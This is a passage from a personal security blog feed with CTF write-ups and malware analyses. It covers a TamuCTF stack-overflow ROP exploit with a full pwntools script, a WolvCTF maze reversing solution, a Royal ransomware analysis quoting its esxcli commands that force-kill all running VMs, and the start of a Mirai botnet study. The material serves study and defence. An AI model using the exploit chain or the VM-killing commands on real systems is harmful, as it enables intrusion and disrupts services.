class="number">500</span>,</span><br><span class="line">               stopwords=stopwords).generate(<span class="built_in">str</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示词云</span></span><br><span class="line">plt.imshow(wc, interpolation=<span class="string">&#x27;bilinear&#x27;</span>)<span class="comment"># 用plt显示图片</span></span><br><span class="line">plt.axis(<span class="string">&quot;off&quot;</span>)  <span class="comment"># 不显示坐标轴</span></span><br><span class="line">plt.show() <span class="comment"># 显示图片</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存到文件</span></span><br><span class="line"><span class="comment"># wc.to_file(&quot;pic.png&quot;)</span></span><br></pre></td></tr></table></figure><p>注意这里的遮罩图片，必须选择蒙版类型的。可以上网搜索，下载比较好康的。之后就保存好啦。效果图如下~做了一点马赛克</p><p><img src="/2023/05/03/decrypt-wechat-db/image-20230503214622287.png" alt="image-20230503214622287"></p><p>其实想想这整个过程，如果要自己做的话，包括了安卓逆向、中文分词、数据可视化等好多步骤，甚至可以作为一种综合练习~hhhh</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/163666886">https://zhuanlan.zhihu.com/p/163666886</a>(但是这里的数据库密码不对，现在测下来只能通过frida hook的方式获取了，一定要装好环境，使用adb等)</li></ol>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wechat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tamuctf-pwnme</title>
      <link href="/2023/05/02/tamuctf-pwnme/"/>
      <url>/2023/05/02/tamuctf-pwnme/</url>
      
        <content type="html"><![CDATA[<p>一道很有意思的基于栈溢出的题目，有两个关键的gadget <code>add byte ptr [rbp - 0x3d], bl</code>以及抬栈技巧，感觉比较巧妙(折磨)，在这里记录一下</p><span id="more"></span><p>这道题题面非常简单，一个ELF的main调用了一个.so里面的pwnme函数，可以在pwnme中溢出0x38字节(不算rbp则为0x30字节)。题目存在一个后门函数<code>win</code>，和pwnme相差0x18字节。</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502185142910.png" alt="image-20230502185142910"></p><p>如果是一般题目，可能会直接想用rop。但是溢出之后由于无法泄露地址，并且动态库开启了PIE，导致无法用puts的PLT输出libc地址。一般情况下可能需要找一些特殊的gadget。这道题给了两种很有意思的思路。</p><h2 id="case1-partial-relro"><a href="#case1-partial-relro" class="headerlink" title="case1 partial relro"></a>case1 partial relro</h2><p>如果ELF文件的GOT表<strong>可以修改</strong>，可以尝试这种方法。这种方法的思想在于用<code>add byte ptr [rbp - 0x3d], bl</code>往GOT表中写数据。这种gadget还算挺常见的，只要有函数返回0，就一定存在这样的gadget。</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502210001453.png" alt="image-20230502210001453"></p><p>而<code>pop rbp, ret</code>这个gadget更为常见。一般在函数返回位置都会有。那么在可写的六个字节中，我们已经可以控制rbp，现在只要往里面写入got[“pwnme”]+0x3d，之后改bl为-0x18，就能改掉pwnme的GOT，之后再想办法调用一次就可以了。</p><p>找到可以修改bl(rbx的低位)寄存器的gadget。如下</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502210703609.png" alt="image-20230502210703609"></p><p>bl的修改依赖于al寄存器，再查看一下al。找到一个可控的gadget，如下。</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502210915517.png" alt="image-20230502210915517"></p><p>那么只剩下rdi需要控制了。如果找一个rdi，其中[rdi]结尾是<code>0xe8</code>即可。在IDA中找到这样的gadget。不难找到</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502211329986.png" alt="image-20230502211329986"></p><p>只需要填上地址0x4011a2即可。</p><p>但是如果正常做，需要以下的ROP chain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(rbp) got[<span class="string">&quot;pwnme&quot;</span>]+<span class="number">0x3d</span></span><br><span class="line">(ret) pop rdi</span><br><span class="line">(ret+<span class="number">8</span>) <span class="number">0x4011a2</span></span><br><span class="line">(ret+<span class="number">0x10</span>) <span class="number">0x401191</span> <span class="comment"># mov rax, qword ptr [rdi]; ret</span></span><br><span class="line">(ret+<span class="number">0x18</span>) <span class="number">0x40118f</span> <span class="comment"># add bl, al;将rbx改成0xe8</span></span><br><span class="line"><span class="comment"># 后面不能修改GOT，因为还需要触发pwnme，只剩两条指令的空间不够</span></span><br><span class="line">(ret+<span class="number">0x20</span>) elf.got[<span class="string">&quot;pwnme&quot;</span>] <span class="comment"># 先再次调用pwnme。这一过程中rbx没有变。</span></span><br></pre></td></tr></table></figure><p>第二次进入<code>pwnme</code>溢出点时，如下所示</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502212419008.png" alt="image-20230502212419008"></p><p>因此，第二次溢出的时候就可以直接通过<code>add    byte ptr [rbp - 0x3d], bl</code>这条指令修改GOT表。然后只要再触发一次<code>pwnme</code>即可。此时空间足够再次调用</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230502212843847.png" alt="image-20230502212843847"></p><blockquote><p>这种方法巧妙的地方是用了<code>add    byte ptr [rbp - 0x3d], bl</code>修改GOT。比较直观，应该是看到这个gadget就改了，而且能直接用函数末尾的pop rbp省去两个gadget的位置。这是一种挺新颖的方法。</p></blockquote><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./pwnme&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libpwnme.so&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">script=<span class="string">&quot;b *0x00000000004011A2&quot;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">io = gdb.debug([<span class="string">&quot;./pwnme&quot;</span>],gdbscript=script)</span><br><span class="line"><span class="comment"># io = process(&quot;./pwnme&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040118b</span></span><br><span class="line">mov_rax_ptr_rdi = <span class="number">0x0000000000401191</span> <span class="comment"># mov rax, qword ptr [rdi] ; ret</span></span><br><span class="line">add_bl_al = <span class="number">0x000000000040118f</span> <span class="comment"># add bl, al ; mov rax, qword ptr [rdi] ; ret</span></span><br><span class="line">add_rbp_bl = <span class="number">0x00000000004011af</span> <span class="comment"># add byte ptr [rbp - 0x3d], bl ; sub rax, rsi ; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;pwnme&quot;</span>]+<span class="number">0x3d</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x4010c5</span>)+p64(mov_rax_ptr_rdi)</span><br><span class="line">payload += p64(add_bl_al)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;me\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2 += p64(elf.got[<span class="string">&quot;pwnme&quot;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload2 += p64(add_rbp_bl)</span><br><span class="line">payload2 += p64(elf.plt[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;me\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="case2-利用prelogue多次写入栈"><a href="#case2-利用prelogue多次写入栈" class="headerlink" title="case2 利用prelogue多次写入栈"></a>case2 利用prelogue多次写入栈</h2><p>第二种方法用<code>sub rsp, 0x18</code>这个主函数中的gadget，那么再次调用<code>pwnme</code>时，之前调用的栈上多写的内容会被当作后面调用时连续的溢出之后的内容，这样就能避免写入立即数并弹出这样的开销。而且这种方法不依赖于GOT表可写与否。</p><p>第二种方法想法是利用<code>call rax</code>这个gadget，想办法将pwnme的GOT和相差的0x18放在一起，构成<code>win</code>的地址，之后放进rax并call。</p><p>第一次返回时，并不对寄存器做操作，而是直接修改返回地址之后的内容为pwnme的PLT，并不知一些栈上的内容，包括0x18这个立即数。可以看到当前栈末端为0x….60</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230503171806055.png" alt="image-20230503171806055"></p><p>第二次调用返回时，栈布局如下所示。这里变成了0x48和之前0x60相差正好是0x18。正是因为我们多减去了一个0x18。<strong>事实上，我们只需要能够溢出0x20字节(包含rbp)就可以了</strong>。可以通过这里的方法反复在栈上写入内容。</p><p><img src="/2023/05/02/tamuctf-pwnme/image-20230503172011248.png" alt="image-20230503172011248"></p><p>第二次调用时，首先拿出GOT表，之后pop rsi;ret修改了RAX寄存器中的值，变为<code>win</code>。之后<code>call rax</code>即可。如果是正常情况下，正好差一个gadget。这题也设计得别有用心。非常有意思！</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ej</title>
      <link href="/2023/03/20/ej/"/>
      <url>/2023/03/20/ej/</url>
      
        <content type="html"><![CDATA[<p><code>ej</code> from wolvctf in English</p><span id="more"></span><h1 id="ej"><a href="#ej" class="headerlink" title="ej"></a>ej</h1><p>Firstly, the program outputs<br><code>puts(&quot;solve my puzzle for a flag ;)  (use u, d, l, r) \nwait i forgot to implement the display functionality :/&quot;);</code>.I suppose <code>u</code> means <code>up</code>, <code>d</code> is down, <code>l</code> is left and <code>r</code> is right. (If you didn’t find it, that doesn’t matter)<br>It’s clearly that the program  only checks our input after <code>strlen</code>, in the <code>if</code> statement.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( maze((__int64)input, s_len) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;correct! :)&quot;</span>);</span><br><span class="line">    sub_5563294E878E((__int64)input, s_len, v4);</span><br><span class="line">    sub_5563294E899C((__int64)v4, (__int64)&amp;byte_5563294EB0C0, <span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_5563294EB0C0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>so all we need to do is to solve <code>maze</code>. Let’s begin !!</p><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>At the beginning of <code>puzzle</code>, the function iterates our input line.<code>v2</code> stands for the bytes we input. From the variable v4 and v5 we can know that the puzzle is a <code>64*4+8</code> byte puzzle, which is 6*6*4. That means it’s a <code>6*6</code> puzzle.<br>    And the logic is like this. Suppose we have a <code>pointer</code> starting at position <code>0</code>.(Like a person trapped in the puzzle, the variable name is <code>v7</code>)</p><pre><code>1. if `v2` is `u` </code></pre><p>It first check if we are at the <code>first line</code>(v7&lt;=5), and then writes <code>3</code> to the position, and decreases pointer <code>v7</code> by 6(going up a line)</p><pre><code>2. if `v2` is `r` </code></pre><p>It first check if we are at the <code> right bound</code>((v7 + 1) % 6==0), and then writes <code>6</code> to the position, and adds pointer <code>v7</code> by 1(going right)</p><pre><code>3. if `v2` is `l` &lt;/br&gt;</code></pre><p>It first check if we are at the <code> left bound</code>((v7 - 1) % 6 == 5), and then writes <code>4</code> to the position, and minus pointer <code>v7</code> by 1(going left)</p><pre><code>4. if `v2` is `d`&lt;/br&gt;</code></pre><p>It first check if we are at the <code> last line</code>(v7 &gt; 29), and then writes <code>5</code> to the position, and adds pointer <code>v7</code> by 6(going down a line)<br></p><p>this procedure, literally, <code>remembers</code> all the <code>choices</code> of the direction changing of the pointer inside the maze at every block. At the last of <code>maze</code> function, there are three confinements we should meet.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> !v7 &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)circle((__int64)v4) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)trinagle((__int64)v4);</span><br></pre></td></tr></table></figure><p>the first <code>!v7</code> means we should <strong>go back to the starting point</strong>. And the next 2 functions are some checkings for the former <code>choices</code> you have made.I named them after <code>circle</code> and <code>trinagle</code></p><h3 id="circle"><a href="#circle" class="headerlink" title="circle"></a>circle</h3><p>To be explict, the circle function checks ** whether the pointer at some certain position forms the same direction from the former block**. And there is a <code>rule</code> block, which looks like this.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    0   1   2   3   4   5</span><br><span class="line">0  ___ ___ ___ ___ ___ ___</span><br><span class="line">1  ___ ___ _1*_ _1_ ___ ___</span><br><span class="line">2  ___ ___ _1_ ___ ___ ___</span><br><span class="line">3  ___ ___ _1_ ___ ___ _1_</span><br><span class="line">4  ___ ___ ___ _1_ _2_ ___</span><br><span class="line">5  _2_ ___ ___ ___ ___ _2_</span><br></pre></td></tr></table></figure><p>Let me explain my former words. for <code>ciecle</code>, it means that when we run into the <code>1</code> in <code>(2,1)</code>(the one with star) from the <code>left</code>, for example, we did from (1,1) to (2,1), we should <strong>only</strong> turn left in (2,1), so we have no choice but go to <code>(3,1)</code>. All the points with <code>1</code> acts the same thing.<br>(The reason is that in <code>circle</code>, it reverses the direction when meets ‘1’, left to right, down to up, and checks whether the number stored are the same. and to sum up. it did the direction checking)</p><h3 id="trinagle"><a href="#trinagle" class="headerlink" title="trinagle"></a>trinagle</h3><p>To be explict, the <code>trinagle</code> function checks <strong>whether the next block of some certain position acts the same thing like I do</strong> for example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    0   1   2   3   4   5</span><br><span class="line">0  ___ ___ ___ ___ ___ ___</span><br><span class="line">1  ___ ___ _1_ _1_ ___ ___</span><br><span class="line">2  ___ ___ _1_ ___ ___ ___</span><br><span class="line">3  ___ ___ _1_ ___ ___ _1_</span><br><span class="line">4  ___ ___ ___ _1_ _2_ ___</span><br><span class="line">5  _2*_ ___ ___ ___ ___ _2_</span><br></pre></td></tr></table></figure><p>when we reach(0,5), if we want to turn right to (1,5), this rule checks that when in (1,5), we should turn right again, that means we have to go like this <code>(0,5)---&gt;(1,5)---&gt;(2,5)</code><br>What’s more, It alse checks that when we reach blocks with <code>2</code>, we should <strong>go from two blocks with the same direction</strong>.For example, if we want to go to <code>(4,4)</code>, we can only have the following choices: (2,4)—&gt;(3,4)—&gt;(4,4) and (4,2)—&gt;(4,3)—&gt;(4,4).The code is shown below</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 == <span class="number">3</span> || v2 == <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*(_BYTE *)(<span class="number">6</span> * i + j + <span class="number">1LL</span> + a1) != <span class="number">4</span> || *(_BYTE *)(<span class="number">6</span> * i + j + <span class="number">2LL</span> + a1) != <span class="number">4</span>)</span><br><span class="line">            &amp;&amp; (*(_BYTE *)(<span class="number">6</span> * i + j - <span class="number">1LL</span> + a1) != <span class="number">6</span> || *(_BYTE *)(<span class="number">6</span> * i + j - <span class="number">2LL</span> + a1) != <span class="number">6</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( (*(_BYTE *)(<span class="number">6</span> * (i + <span class="number">1</span>) + j + a1) != <span class="number">3</span> || *(_BYTE *)(<span class="number">6</span> * (i + <span class="number">2</span>) + j + a1) != <span class="number">3</span>)</span><br><span class="line">               &amp;&amp; (*(_BYTE *)(<span class="number">6</span> * (i - <span class="number">1</span>) + j + a1) != <span class="number">5</span> || *(_BYTE *)(<span class="number">6</span> * (i - <span class="number">2</span>) + j + a1) != <span class="number">5</span>) )</span><br></pre></td></tr></table></figure><p>And that’s it ! the <code>maze</code> game.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>While my solution is shown below. the program gives the output <code>correct</code> but didn’t give the flag :) It may because there are various solutions for that</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    0   1   2   3   4   5</span><br><span class="line">0  _5_ _4_ _4_ _4_ _4_ _4_</span><br><span class="line">1  _5_ _6_ _6_ _6_ _6_ _3_</span><br><span class="line">2  _5_ _3_ _4_ _4_ _5_ _4_</span><br><span class="line">3  _5_ _6_ _6_ _3_ _5_ _3_</span><br><span class="line">4  _5_ _3_ _4_ _4_ _4_ _3_</span><br><span class="line">5  _6_ _6_ _6_ _6_ _6_ _3_</span><br></pre></td></tr></table></figure><p>the string input is <code>dddddrrrrruuulddlllurrullurrrrulllll</code><br>The output is </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ej ./ej       </span><br><span class="line">solve my puzzle for a flag ;)  (use u, d, l, r) </span><br><span class="line">wait i forgot to implement the display functionality :/</span><br><span class="line">dddddrrrrruuulddlllurrullurrrrulllll</span><br><span class="line">correct! :)</span><br><span class="line">I[�X𴱍&gt;:G��F�㿛�1Q���</span><br><span class="line">                     %��</span><br></pre></td></tr></table></figure><p>But anyway, the task is fun !!!   :p</p>]]></content>
      
      
      <categories>
          
          <category> rev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> maze </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>royal_randomeware analysis</title>
      <link href="/2023/02/07/royal_ransomeware/"/>
      <url>/2023/02/07/royal_ransomeware/</url>
      
        <content type="html"><![CDATA[<p>这次分析的royal randomeware是一个勒索软件。他最近非常活跃(最后一次报告就是今天早上)。其实原理还是挺简单的。总共分析起来也不算特别复杂。</p><span id="more"></span><h1 id="royal-ransomeware分析"><a href="#royal-ransomeware分析" class="headerlink" title="royal ransomeware分析"></a>royal ransomeware分析</h1><p>给的样本是一个x86-64架构的ELF文件。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207130025265.png" alt="image-20230207130025265"></p><h2 id="命令行参数分析"><a href="#命令行参数分析" class="headerlink" title="命令行参数分析"></a>命令行参数分析</h2><h3 id="id参数"><a href="#id参数" class="headerlink" title="id参数"></a>id参数</h3><p>该软件是一个64位，没有经过加壳的可执行文件。在main()函数中，首先，他将从命令行获取参数。包括”-id”，“-ep”，”-stopvm”,”-fork”,”-logs”</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207155025850.png" alt="image-20230207155025850"></p><p>其中”-id”从命令行接受一个32byte的字符，这个ID在后面被用来输出到加密后生成的readme中。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207130739054.png" alt="image-20230207130739054"></p><p><img src="/2023/02/07/royal_ransomeware/image-20230207130625464.png" alt="image-20230207130625464"></p><p>上述id将会被输入到的网址部分如下所示。是受害者需要联系的一个网址</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207151328797.png" alt="image-20230207151328797"></p><p>同时，在样本中追溯socket函数调用，发现并不存在上述说明中所说的，文件被转移到一个安全的服务器上。并没有调用任何socket函数。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207150821110.png" alt="image-20230207150821110"></p><h3 id="ep参数"><a href="#ep参数" class="headerlink" title="ep参数"></a>ep参数</h3><p>ep参数指代了需要加密的起始文件夹。读取时会递归查找指定文件夹下面的子文件夹。判断如果后缀没有已经加密过的标记则将其加入待加密队列中。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207151822702.png" alt="image-20230207151822702"></p><p><img src="/2023/02/07/royal_ransomeware/image-20230207151911065.png" alt="image-20230207151911065"></p><h3 id="stopvm参数"><a href="#stopvm参数" class="headerlink" title="stopvm参数"></a>stopvm参数</h3><p>stopvm参数将会停止所有运行中的esxcli虚拟机。通过以下命令。相关汇编和伪代码如下所示。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esxcli vm process list &gt; list # 读取所有运行中的虚拟机，获取其ID</span><br><span class="line">esxcli vm process kill --type=hard --world-id=%s # 强行关闭所有上述获得到的虚拟机</span><br></pre></td></tr></table></figure><p><img src="/2023/02/07/royal_ransomeware/image-20230207152311397.png" alt="image-20230207152311397"></p><p><img src="/2023/02/07/royal_ransomeware/image-20230207152327739.png" alt="image-20230207152327739"></p><h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><p>在解析上述命令行参数之后，进入加密阶段。加密函数主要在0x40B641的线程函数中。程序会根据sysconf获取CPU核数，从而计算开启多少加密线程。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207152556225.png" alt="image-20230207152556225"></p><p>加密阶段首先会导入KEY。这个KEY是一个RSA的公钥，被硬编码在文件中。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207152754582.png" alt="image-20230207152754582"></p><p>接着程序申请了一个堆块用来保存作为加密中文件以及加密结果的临时储存空间。堆块大小为0xfa000字节。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207152900972.png" alt="image-20230207152900972"></p><p>接下来就开始不断地从上述从ep参数中获取的起始文件夹下面的所有文件的队列中取出文件，并打开。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207153121658.png" alt="image-20230207153121658"></p><p>打开之后进入真正的加密函数<code>encrypt</code>中，位置如下所示。这里会将文件内容加密，并重新储存。在后文会分析encrypt的具体内容。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207153237044.png" alt="image-20230207153237044"></p><p>在加密完之后，会重命名文件。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207153438591.png" alt="image-20230207153438591"></p><h3 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt()"></a>encrypt()</h3><p>接下来着重看是如何做到加密的。首先，生成两个大小分别为0x20以及0x10的随机数，生成方法首选是从openssl中<code>RAND_get_rand_method</code>中获取一种随机数生成方法来生成。如果不成功，则从<code>/dev/urandom</code>中读取并生成。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207153818620.png" alt="image-20230207153818620"></p><p>接下来，使用上面load过的RSA公钥来加密上述0x20大小的随机字串，用来作为后续AES加密的密钥。使用的是openssl的<code>RSA_public_encrypt</code>函数。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207154011719.png" alt="image-20230207154011719"></p><p>接着开始计算文件需要加密的轮数。这里计算是根据文件大小进行的。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207154216190.png" alt="image-20230207154216190"></p><p>接下来设置AES的密钥为上述RSA加密的结果，并调用openssl的AES加密函数进行加密。一次加密至多1024000字节，也就是1MB。超出1MB的需要多轮加密。轮数就是上面计算的内容。可以发现勒索文件直接把加密之后的内容写回了文件，没有保存备份。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207154501311.png" alt="image-20230207154501311"></p><p>对应的汇编文件位置如下所示。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207154649552.png" alt="image-20230207154649552"></p><p>在加密之后，勒索软件把使用RSA加密之前的随机数、文件原始大小、轮数信息写到了文件的末尾。应该是后续用来恢复使用。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207154913229.png" alt="image-20230207154913229"></p><p>经过上述过程，就算是加密完了一个文件，之后的内容就是修改名字，然后继续在队列中找到下一个可以加密的文件进行加密。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上述勒索软件识别所有的被顶目录下的文件(readdir返回的文件类型为<code>DT_REG</code>的文件，也就是<code>regular file</code>)。采用的加密算法是首先读取随机数(通过openssl或者/dev/urandom)，并将其用RSA公钥加密得到的内容作为AES-CBC加密的密钥，使用OPENSSL的AES-CBC加密方式加密。钱包地址信息也非常聪明的没有直接显示在ELF文件中，而是需要命令函数输入，格式化字符串的方式显示给用户，如下所示。</p><p><img src="/2023/02/07/royal_ransomeware/image-20230207151328797.png" alt="image-20230207151328797"></p><p>该勒索软件没有地区豁免功能。</p><p>通过谷歌查找上述网址对应组织，可以查到以下内容</p><p><img src="file:///C:/Users/15302/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p><p>以下网址包含了对该组织的介绍。</p><p><a href="https://ransomwatch.telemetry.ltd/#/profiles?id=royal">https://ransomwatch.telemetry.ltd/#/profiles?id=royal</a></p><p>该勒索软件会把源文件加密后的内容，RSA加密之前的随机数，加密轮数，文件大小放在源文件结尾，并将加密之后的文件重命名。加密过程中会识别文件后缀名中是否存在<code>.royal_u</code>,<code>royal_w</code>,<code>.sf</code>,<code>.v00</code>,<code>.b00</code>,<code>.royal_log_</code>,’readme’字符串，如果有则不进行加密。</p><p>样本不存在反调试或者反沙箱手段。可以在IDA_PRO中正常反编译，可以在Ubuntu22.04虚拟机中正常运行（vmware）。</p>]]></content>
      
      
      <categories>
          
          <category> malware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ransomeware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mirai_botnet_analysis</title>
      <link href="/2023/02/05/mirai/"/>
      <url>/2023/02/05/mirai/</url>
      
        <content type="html"><![CDATA[<p>Mirai属于经典的物联网僵尸网络，产生时间比较久，因此在github上有其<a href="https://github.com/jgamblin/Mirai-Source-Code">泄露的源码</a>。接下来内容我将按照源码进行分析。另外还有一个正在流行的僵尸网络样本Gafgyt，也将在本文后半部分分析。这也是我第一次分析恶意软件。</p><span id="more"></span><h1 id="Mirai分析"><a href="#Mirai分析" class="headerlink" title="Mirai分析"></a>Mirai分析</h1><p>Mirai属于经典的物联网僵尸网络，产生时间比较久，因此在github上有其<a href="https://github.com/jgamblin/Mirai-Source-Code">泄露的源码</a>。接下来内容我将按照源码进行分析。</p><p>Mirai主要由三个部分组成。其中dlr部分为不同架构下，黑客所投放的病毒实施远程下载的编译好的二进制文件。loader部分运行在黑客主机上，主要进行telnet爆破，并进行弱口令猜测攻击目标路由器或者暴露的IOT设备。bot是在loader运行成功之后，发送到远程僵尸主机上的病毒文件，其主要工作是接受黑客指令创建用户，完成DDoS攻击。</p><p><img src="/2023/02/05/mirai/image-20230203213936362.png" alt="image-20230203213936362"></p><p>接下来对这三部分做详细分析。</p><h2 id="loader部分"><a href="#loader部分" class="headerlink" title="loader部分"></a>loader部分</h2><p>loader部分主要完成远程IOT设备的telnet密码爆破，权限获取，以及远程传递病毒文件。</p><p>在loader的main.c中，可以看到一共调用了以下几种重要函数。</p><p><img src="/2023/02/05/mirai/image-20230203215142523.png" alt="image-20230203215142523"></p><h3 id="binary-init"><a href="#binary-init" class="headerlink" title="binary init"></a>binary init</h3><p>实际上就是把所有下载器文件读取到本地栈变量上，用一个数据结构保存下来。后续会用echo将这些下载器传给受控制的IOT设备上，用来下载真正的病毒。</p><p><img src="/2023/02/05/mirai/image-20230203215541953.png" alt="image-20230203215541953"></p><h3 id="dlr"><a href="#dlr" class="headerlink" 